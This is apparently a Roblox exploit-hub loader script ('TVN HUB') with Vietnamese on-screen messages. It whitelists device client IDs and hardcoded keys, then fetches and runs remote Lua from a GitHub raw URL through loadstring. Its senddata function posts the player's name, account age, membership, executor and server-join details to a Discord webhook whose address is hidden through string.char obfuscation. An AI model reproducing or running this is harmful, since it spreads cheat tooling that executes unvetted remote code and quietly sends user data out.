function senddata()
if not game:IsLoaded() then --check game load
game.Loaded:Wait()
end
repeat
task.wait()
until game:GetService("Players") and game:GetService("Workspace") and game:GetService("ReplicatedStorage")

if TVNHUB_LOADED12 == true then
	print("Loaded")
	return
end

pcall(function() getgenv().TVNHUB_LOADED12 = true end)
local idserver = "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport',"..game.JobId.."))"
local ThisShitIsBroken1IlI1I1IlI1=string.char; local LindseyGudLua1IlI1=warn; local ThisIsShit1IlI11IlI1IlI1=_G; local ThisShitIsBroken1IlI1IlI1I1IlI1=print; local LindseyGudLua1IlI1I1IlI1I=nil; local LindseyGudLua1IlI1IlI11IlI1IlI=unpack; local LindseyGudLua1IlI1IlI=getfenv; local ThisShitIsBroken1IlI11IlI1=true; local LolYouWillCrackFast1IlI11IlI11IlI1I=pairs; local ThisIsShit1IlI1IlI11IlI1IlI1IlI1IlI1=next; local ThisIsShit1IlI11IlI1IlI1I=false; local ThisIsShit1IlI1IlI1I1IlI11IlI1IlI1I=loadstring; local LindseyGudLua1IlI1IlI1I1IlI11IlI1=printidentity; local ThisIsShit1IlI1IlI1IlI1I=debug; local LindseyGudLua1IlI1Il=tostring; local ThisShitIsBroken1IlI1IlI11IlI1Il1IlI1IlI=getmetatable; local ThisIsShit1IlI1Il1IlI1IlI1=error; function LolYouWillCrackFast1IlI1IlI11IlI1Il(LindseyGudLua1IlI1IlI1) local  ThisShitIsBroken1IlI1I = ""; for  i,v in LolYouWillCrackFast1IlI11IlI11IlI1I(LindseyGudLua1IlI1IlI1) do  ThisShitIsBroken1IlI1I =  ThisShitIsBroken1IlI1I..ThisShitIsBroken1IlI1I1IlI1(v*2); end return( ThisShitIsBroken1IlI1I) end;local a1 = (LolYouWillCrackFast1IlI1IlI11IlI1Il({-46 + 98, 22.5 + 35.5, -13 + 71, -5 + 61, -23 + 80.5, -18 + 47, -42 + 65.5, -98 + 121.5}))
local a2 = (LolYouWillCrackFast1IlI1IlI11IlI1Il({-67 + 117, -29 + 81.5, -34 + 91.5, 31 + 18.5, -22 + 77.5, 54.5 + 2.5, 19 + 31, 5.5 + 17.5, -53.5 + 103, 35.5 + 20, 3 + 51.5}))
local a3 = (LolYouWillCrackFast1IlI1IlI11IlI1Il({6.5 + 17, 34.5 + 14, -71.5 + 127.5, 24.5 + 28}))
local a4 = (LolYouWillCrackFast1IlI1IlI11IlI1Il({-42 + 65.5, -47.5 + 107, -28 + 78.5, 11 + 38, -29.5 + 81.5, -11.5 + 67, -7.5 + 63, -71 + 124.5, 20 + 37.5}))
local a5 = (LolYouWillCrackFast1IlI1IlI11IlI1Il({-75 + 98.5, -43 + 67.5, -74.5 + 98.5, -25 + 51.5, -87 + 114, -8.5 + 36.5, -20.5 + 45, -74.5 + 103, -89 + 117.5, 17.5 + 9, -93 + 121.5, -40.5 + 67.5, 15.5 + 11, -1 + 25, -58.5 + 85, -86 + 114, -17.5 + 44.5, 19 + 8.5, 22 + 3, -31.5 + 58.5}))
local a6 = "/-CURs-DZo0xoG8jzMUzHiWDLLwC31ylcp3DTDPTqQIFb0dn2bU84t80MKMu1u5fQ6q2C"
getgenv().DiscordWebhook = ("" ..a1.. "" ..a2.. "" ..a3.. "" ..a4.. "" ..a5.. "" ..a6) -- Discord Webhook Here
getgenv().embedcolor = "0x00FF00" -- Embed Body Color (On left Side of the Embed, You can get HEX Code above â) 

local a= os.time()local a= os.date('!*t', a)plr= game:GetService'Players'.LocalPlayer;local b=false;local c=false;if plr.MembershipType==Enum.MembershipType.Premium then b=true elseif plr.MembershipType==Enum.MembershipType.None then b=false end;if b==false then if plr.AccountAge<=70 then c=true end end;local c= game:GetService("MarketplaceService")local c= c:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)local function d()local a=
       (TRIGON_LOADED and "Trigon EVO")or(syn and not is_sirhurt_closure and not pebc_execute and "Synapse")or(secure_load and "Sentinel")or(EVON_LOADED and "Evon")or(is_sirhurt_closure and "Sirhurt")or(pebc_execute and "ProtoSmasher")or(KRNL_LOADED and "Krnl")or(OXYGEN_LOADED and "Oxygen U")or(WrapGlobal and "WeAreDevs")or(IsElectron and "Electron")or(isvm and "Proxo")or(shadow_env and "Shadow")or(jit and "EasyExploits")or(getreg()['CalamariLuaEnv'] and "Calamari")or(unit and "‎")or(IS_VIVA_LOADED and "VIVA")or(IS_COCO_LOADED and "Coco")or("Unsupported Executor")return a end;local a= {
			["title"] = "> TVN HUB™ | **"..Game.Players.LocalPlayer.Name.." used your script**",
			["description"] = "```This was executed on "..c.Name.."```",
			["type"] = "rich",
			["color"] = tonumber(getgenv().embedcolor),
	                ["thumbnail"] = {
				["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"
			},
			["image"] = {
				["url"] = "http://www.roblox.com/Thumbs/Asset.ashx?Width=768&Height=432&AssetID="..game.PlaceId
			},
			["fields"] = {
							{
					["name"] = "Executor Info",
					["value"] = "```Executor Used ▶ "..(d()).."```",
					["inline"] = true
				},
								{
					["name"] = "Membership Info:",
					["value"] = "```Membership Type ▶ "..tostring(b).."```",
					["inline"] = true
				},
				{
                    ["name"] = "Game Link Info",
                    ["value"] = "```Game link ▶ https://roblox.com/games/" .. game.PlaceId .. "/```",
                    ["inline"] = false
                },
                				{
					["name"] = "Account Age Info",
					["value"] = "```Account Age ▶ "..plr.AccountAge.."```",
					["inline"] = true
				},
				{
					["name"] = "Alt Account Info:",
					["value"] = "```Alt Account ▶ "..tostring(b).."```",
					["inline"] = true
				},
								{
					["name"] = "Server Join Command",
					["value"] = "```"..idserver.."```",
					["inline"] = false
				},
			},
			["footer"] = {
			    ["text"] = "🔔 Executed by "..Game.Players.LocalPlayer.Name.." on "..c.Name.."",
			    ["icon_url"] = "https://cdn.discordapp.com/attachments/1056820926555107368/1056820961439129620/adad.gif"
			},
			["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', a.year, a.month, a.day, a.hour, a.min, a.sec),
}(syn and syn.request or http_request or http.request) {
    Url = ''..getgenv().DiscordWebhook..'';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {a}; });
}
end
local ID = game:GetService("RbxAnalyticsService"):GetClientId();

game.StarterGui:SetCore("SendNotification", {Title="TVNHUB"; Text="Dang Xac Thuc..."; Duration=1;})
wait(2)

if ID == "1" then -- BEF49A83-21F6-4BB5-967E-3A106BB817AC
	game.StarterGui:SetCore("SendNotification", {Title="TVNHUB"; Text="Thanh Cong!"; Duration=1;})
elseif ID == "47754BBE-0449-4482-BEF8-154641307F1F" then --Triet2804
	game.StarterGui:SetCore("SendNotification", {Title="TVNHUB"; Text="Thanh Cong!"; Duration=1;})
	senddata()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/HackerTheBestYTB/ScriptRoblox/test/Intro.lua"))()
elseif ID == "9c303aa0-61a6-4d85-a49d-81107c97d919" then --PTA Mobile
	game.StarterGui:SetCore("SendNotification", {Title="TVNHUB"; Text="Thanh Cong!"; Duration=1;})
	loadstring(game:HttpGet("https://raw.githubusercontent.com/HackerTheBestYTB/ScriptRoblox/test/Intro.lua"))()
elseif ID == "a17f4131-3427-415d-b915-833b1ce6c873" then --HUY Mobile
	game.StarterGui:SetCore("SendNotification", {Title="TVNHUB"; Text="Thanh Cong!"; Duration=1;})
	loadstring(game:HttpGet("https://raw.githubusercontent.com/HackerTheBestYTB/ScriptRoblox/test/Intro.lua"))()
elseif ID == "5" then
	game.StarterGui:SetCore("SendNotification", {Title="TVNHUB"; Text="Thanh Cong!"; Duration=1;})
	loadstring(game:HttpGet("https://raw.githubusercontent.com/HackerTheBestYTB/ScriptRoblox/test/Intro.lua"))()
elseif ID == "5" then
	game.StarterGui:SetCore("SendNotification", {Title="TVNHUB"; Text="Thanh Cong!"; Duration=1;})
	loadstring(game:HttpGet("https://raw.githubusercontent.com/HackerTheBestYTB/ScriptRoblox/test/Intro.lua"))()
elseif _G.Key == "Triet2804" then
	game.StarterGui:SetCore("SendNotification", {Title="TVNHUB"; Text="Thanh Cong!"; Duration=1;})
	senddata()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/HackerTheBestYTB/ScriptRoblox/test/Intro.lua"))()
elseif _G.Key == "lamconbacgau1234" then
	game.StarterGui:SetCore("SendNotification", {Title="TVNHUB"; Text="Thanh Cong!"; Duration=1;})
	senddata()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/HackerTheBestYTB/ScriptRoblox/test/Intro.lua"))()
elseif _G.Key == "quancter2k7" then
	game.StarterGui:SetCore("SendNotification", {Title="TVNHUB"; Text="Thanh Cong!"; Duration=1;})
	senddata()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/HackerTheBestYTB/ScriptRoblox/test/Intro.lua"))()
else	
	game.StarterGui:SetCore("SendNotification", {Title="TVNHUB"; Text="Ban ko co trong whitelist!"; Duration=1;})
	game.StarterGui:SetCore("SendNotification", {Title="TVNHUB"; Text="Da copy id, vui long gui admin!"; Duration=1;})
	setclipboard(ID)
	--wait(5)
	--game.Players.LocalPlayer:Kick("ID sai.")
	--wait(99999)
	pcall(function() getgenv().TVNHUB_LOADED = true end)
end
--loadstring(game:HttpGet("https://raw.githubusercontent.com/HackerTheBestYTB/ScriptRoblox/test/Intro.lua"))()
